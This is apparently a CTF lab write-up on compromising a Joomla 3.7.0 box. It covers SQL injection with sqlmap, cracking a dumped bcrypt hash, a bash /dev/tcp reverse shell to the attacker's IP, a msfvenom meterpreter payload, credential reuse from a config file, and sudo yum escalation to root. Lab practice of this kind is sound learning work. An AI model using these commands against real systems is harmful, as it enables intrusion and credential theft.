```
ip: 10.10.220.84
```

## I did this Box in multiple steps and not in 1 sitting, so the IP might change throughout ###


Server:
Apache/2.4.6 (CentOS) PHP/5.6.40


Find Joomla Version :
Google shows this URL might be accessible:
http://10.10.244.64/administrator/manifests/files/joomla.xml
Shows version : 3.7.0

Article written by :
  Written by Super User



SqlMAP :
  After a lot of trial and error,Steps:

    1. Check all databases with -DBS
      --dbs
    2. See if we can find users with --users --passwords
      See only localhost is allowed
    3. See which Columns
      --tables for `joomla`
    4. Google which tables exist and which hold user data.
    5. Enumerate #__users
    6. Find columns, dump password.

    Database: joomla
    Table: #__users
    [1 entry]
    +-----+------------+--------------------------------------------------------------+
    | id  | name       | password                                                     |
    +-----+------------+--------------------------------------------------------------+
    | 811 | Super User | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
    +-----+------------+--------------------------------------------------------------+

`hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'`
Produces:

```
  Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
  [+] Blowfish(OpenBSD)
  [+] Woltlab Burning Board 4.x
  [+] bcrypt
```


After some investigation, it seems this is a Bcrypt hash.

`cat superuser.txt
$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
john --wordlist=/root/win_downloads/rockyou.txt superuser.txt --format=bcrypt`

```

  spiderman123     (?)

```

i went to /administrator/ and logged in with jonah and spiderman123 as user/pass.

now to make a reverse shell:

bash -i >& /dev/tcp/10.14.12.121/6666 0>&1

Linux version 3.10.0-1062.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-36) (GCC) ) #1 SMP Wed Aug 7 18:08:02 UTC 2019


Messing with dirtyc0w, didnt work.

linpeas found:
public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';


After i came back to it after a while (Got stuck gaming Kappa) i figured i'd try to make a metepreter shell with msfvenom and msfconsole, this was quite simple in the end:

Generate PHP payload:
  `msfvenom -p php/meterpreter/reverse_tcp lhost=10.14.12.121 lport=4444`

Open Metasploit Metepreter Handler:
  `set payload php/meterpreter/reverse_tcp`
  `set lhost 10.14.12.121`
  `set lport 4444`
  `exploit`

_reference : https://www.hackingarticles.in/joomla-reverse-shell/ _
Then run the Preview.


With the details we got from the Configuration PHP we will try to login to the local user account.
  su - jjameson
  password: nv5uz9r3ZEDzVjNu (From the config file)

Now that we are user, we check which files sudo can run without password:
  `sudo -l`

This Shows
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```
If we check GTFObins for Yum, we find a small little script we can copy-paste to escape to root:

  https://gtfobins.github.io/gtfobins/yum/
After running this we are ROOT.

cat /root/root.txt

Gives us the answer
